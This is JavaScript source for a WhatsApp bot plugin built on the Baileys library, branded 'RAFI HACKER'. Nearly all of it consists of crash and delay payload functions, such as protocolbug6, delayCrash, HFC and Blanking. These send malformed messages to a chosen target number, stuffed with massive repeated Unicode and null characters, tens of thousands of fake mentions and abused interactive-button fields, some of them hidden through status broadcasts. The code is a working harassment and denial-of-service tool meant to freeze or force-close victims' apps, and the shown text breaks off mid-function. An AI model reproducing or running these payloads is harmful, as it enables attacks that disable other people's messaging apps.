import { 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} from "@adiwajshing/baileys"
import fs from 'fs'
import util from 'util'
import crypto from 'crypto'
import chalk from 'chalk'
let handler = async (m, { conn, usedPrefix, command, text, args, isBotAdmin, isAdmin, isOwner }) => {
const rafiacces = JSON.parse(fs.readFileSync("./database/rafimurbug.json"));
const iscreator = [global.setting.owner, ...global.nodev].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isbot = [global.conn.user.jid].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const ismurbug = [global.conn.user.jid, ...rafiacces].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
let prefix = usedPrefix
let rafiganteng = conn
const RC = global.setting.tampilan
const q = text

/*=================================

  INI WM BUAT BOT SELESAI WEE

=================================*/

async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `
 𝚂𝚞𝚌𝚌𝚎𝚜 𝚜𝚎𝚗𝚍 𝚋𝚞𝚐 𝚝𝚘 𝚃𝚊𝚛𝚐𝚎𝚝!

⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀🎭〽️` 

let buttons = [
        { buttonId: ".rafiallmenu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐦𝐞𝐧𝐮" } }
    ];

    let buttonMessage = {
        image: {url: global.setting.tampilan },
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.setting.idch,
                newsletterName: global.setting.namach
            }
        },
        footer: "RAFI HACKER",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await rafiganteng.sendMessage(m.chat, buttonMessage, { quoted: m });
}

/*=================================

     FUNNNCCCCC BUG WEEEEEEEEE

=================================*/
async function carousel(rafiganteng, target) {
 let haxxn = 60;

 for (let i = 0; i < haxxn; i++) {
 let push = [];
 let buttt = [];

 for (let i = 0; i < 5; i++) {
 buttt.push({
 "name": "galaxy_message",
 "buttonParamsJson": JSON.stringify({
 "header": "null",
 "body": "xxx",
 "flow_action": "navigate",
 "flow_action_payload": { screen: "FORM_SCREEN" },
 "flow_cta": "Grattler",
 "flow_id": "1169834181134583",
 "flow_message_version": "3",
 "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
 })
 });
 }

 for (let i = 0; i < 1000; i++) {
 push.push({
 "body": {
 "text": "\u0000\u0000\u0000\u0000\u0000"
 },
 "footer": {
 "text": ""
 },
 "header": {
 "title": '𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉 ϟ\u0000\u0000\u0000\u0000',
 "hasMediaAttachment": true,
 "imageMessage": {
 "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
 "mimetype": "image/jpeg",
 "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
 "fileLength": "591",
 "height": 0,
 "width": 0,
 "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
 "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
 "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
 "mediaKeyTimestamp": "1721344123",
 "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
 "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
 "scanLengths": [
 247,
 201,
 73,
 63
 ],
 "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
 }
 },
 "nativeFlowMessage": {
 "buttons": []
 }
 });
 }

 const carousel = generateWAMessageFromContent(target, {
 "viewOnceMessage": {
 "message": {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 "interactiveMessage": {
 "body": {
 "text": "\u0000\u0000\u0000\u0000"
 },
 "footer": {
 "text": "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉 "
 },
 "header": {
 "hasMediaAttachment": false
 },
 "carouselMessage": {
 "cards": [
 ...push
 ]
 }
 }
 }
 }
 }, {});
await rafiganteng.relayMessage(target, carousel.message, {
messageId: carousel.key.id,
participant: { jid: target }
 });
 }
}

//delay invis akwowkwkks
//delay invis akwowkwkks
async function invisKontak(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "Lezz DcodeR",
                    vcard: `BEGIN:VCARD
VERSION:3.0
FN:Lezz DcodeR
TEL;type=CELL;type=VOICE;waid=6281915843156:+62 819-1584-3156
END:VCARD`,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await rafiganteng.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function DelayStc(rafiganteng, target) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: target,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: "9999999999",
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: "9999999999",
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await rafiganteng.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
}

async function protocolbug6(target, mention) {
    const quotedMessage = {
        extendedTextMessage: {
            text: "᭯".repeat(12000),
            matchedText: "https://" + "ꦾ".repeat(500) + ".com",
            canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
            description: "\u0000".repeat(500),
            title: "\u200D".repeat(1000),
            previewType: "NONE",
            jpegThumbnail: Buffer.alloc(10000), // Ukuran disesuaikan untuk keamanan
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: "BoomXSuper",
                    body: "\u0000".repeat(10000),
                    thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
                },
                mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
            }
        },
        paymentInviteMessage: {
            currencyCodeIso4217: "USD",
            amount1000: 999999999, // Ubah ke tipe number
            expiryTimestamp: 9999999999,
            inviteMessage: "Payment Invite" + "💥".repeat(1770),
            serviceType: 1
        }
    };

    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".BUILDXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/some_artwork_path.enc",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/video_path.enc",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: 9999999,
        seconds: 999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/video_path.enc",
        mediaKeyTimestamp: 1743848703,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `BXZ NOT DEV🤪`,
                body: `${"\u0000".repeat(9117)}`,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: null,
                sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
            },
            businessMessageForwardInfo: {
                businessOwnerJid: target
            },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "exampleSidecarData",
        thumbnailDirectPath: "/v/t62.36147-24/thumb_path.enc",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rafiganteng.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rafiganteng.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function delayCrash(target, mention, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await rafiganteng.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await rafiganteng.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐃𝐞𝐯🐉" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar target
        await new Promise(res => setTimeout(res, delayMs));
    }
}

//𝐟𝐜 𝐬𝐩𝐚𝐦
async function HFC(target, Vkys, Amount, ptcp = true) {
  const Vdata = "*我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️* *我已激活梦幻传输龙卷风‼️*"
  
   let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        hasMediaAttachment: false
       },
       body: {
        text: "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐃𝐞𝐯🐉🐉⭑" + "ꦾ".repeat(Amount),
       },
       nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [{
          name: "single_select",
          buttonParamsJson: Vdata + "\u0000"
         },
         {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
         {
          name: "call_permission_request",
          buttonParamsJson: Vdata + "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐃𝐞𝐯🐉⭑"
         },
        ]
       }
      }
     }
    }
   }, {
    userJid: target,
    quoted: Vkys
   });
            await rafiganteng.relayMessage(target, msg.message, ptcp ? {
    participant: {
     jid: target
    }
   } : {});     
   console.log(chalk.green("Force Close Spaming Sended"));
}
//𝐰𝐚𝐚𝐩𝐢
async function WaApi(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Tama WhatsApp Api",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {},
            body: {
              text: "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "𝐁𝐱𝐳 𝐧𝐨𝐭 𝐝𝐞𝐯🐉🐉"
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await rafiganteng.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function Blanking(isTarget) {
let msg = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
mentionedJid: [isTarget],
isForwarded: true,
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
newsletterName: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀",
serverMessageId: 1
}
},
header: {
title: "",
...(await prepareWAMessageMedia({
image: {  
url: "https://files.catbox.moe/85dmew.jpg",
gifPlayback: true
}
}, {
upload: rafiganteng.waUploadToServer,
mediaType: "image"
})),
hasMediaAttachment: true
},
body: { text: "" },
footer: { text: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀" },
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"ꦾ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
},
{
name: "quick_reply",
buttonParamsJson: `{"display_text": "", "id": ""}`
},
{
name: "cta_url",
buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
},
{ name: "mpm", buttonParamsJson: "{}" },
{ name: "payment_method", buttonParamsJson: "{}" },
{ name: "call_permission_request", buttonParamsJson: "{}" },
{ name: "form_message", buttonParamsJson: "{}" },
{ name: "wa_payment_learn_more", buttonParamsJson: "{}" },
{ name: "wa_payment_transaction_details", buttonParamsJson: "{}" },
{ name: "wa_payment_fbpin_reset", buttonParamsJson: "{}" },
{ name: "catalog_message", buttonParamsJson: "{}" },
{ name: "payment_info", buttonParamsJson: "{}" },
{ name: "review_order", buttonParamsJson: "{}" },
{ name: "send_location", buttonParamsJson: "{}" },
{ name: "payments_care_csat", buttonParamsJson: "{}" },
{ name: "view_product", buttonParamsJson: "{}" },
{ name: "payment_settings", buttonParamsJson: "{}" },
{ name: "address_message", buttonParamsJson: "{}" },
{ name: "automated_greeting_message_view_catalog", buttonParamsJson: "{}" },
{ name: "open_webview", buttonParamsJson: "{}" },
{ name: "message_with_link_status", buttonParamsJson: "{}" },
{ name: "payment_status", buttonParamsJson: "{}" },
{ name: "extensions_message_v2", buttonParamsJson: "{}" },
{ name: "landline_call", buttonParamsJson: "{}" },
{ name: "review_and_pay", buttonParamsJson: "{}" },
{
name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
]
}
}
}
}
}), { userJid: isTarget, quoted: null });

await rafiganteng.relayMessage(isTarget, msg.message, { messageId: msg.key.id });
}

async function delayMakerInvisible(target) {
    console.log(`[LOG] ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    rafigantengCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnrafigantengCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀 𖣂      - 〽${"ꥈz҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀ꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀 ********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "\u0003" + "ꦽ".repeat(102002) + "\u0003".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await rafiganteng.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[SUCCESS] ${target}`);
}

async function flowerColors(target) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀",
hasMediaAttachment: false
},
body: {
text: "저스틴z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀"
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [{
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)"
},
{
name: "call_permission_request",
buttonParamsJson: "JSON.stringify(listMessage)"
}, 
{
name: "view_product",
buttonParamsJson: "JSON.stringify(listMessage)",
}, 
{
name: "payment_info",
buttonParamsJson: "JSON.stringify(listMessage)",
}, 
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
},
{
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀 Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
}
]
}
}
}
}
}, {});
await rafiganteng.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target }
});
console.log(`z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡🚀${target}`);
}

async function FlowX110(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡ ᐛ",
              hasMediaAttachment: false,
            },
            body: {
              text: "z҉e҉x҉r҉o҉ x҉ b҉u҉i҉l҉d҉⚡ ᐛ",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
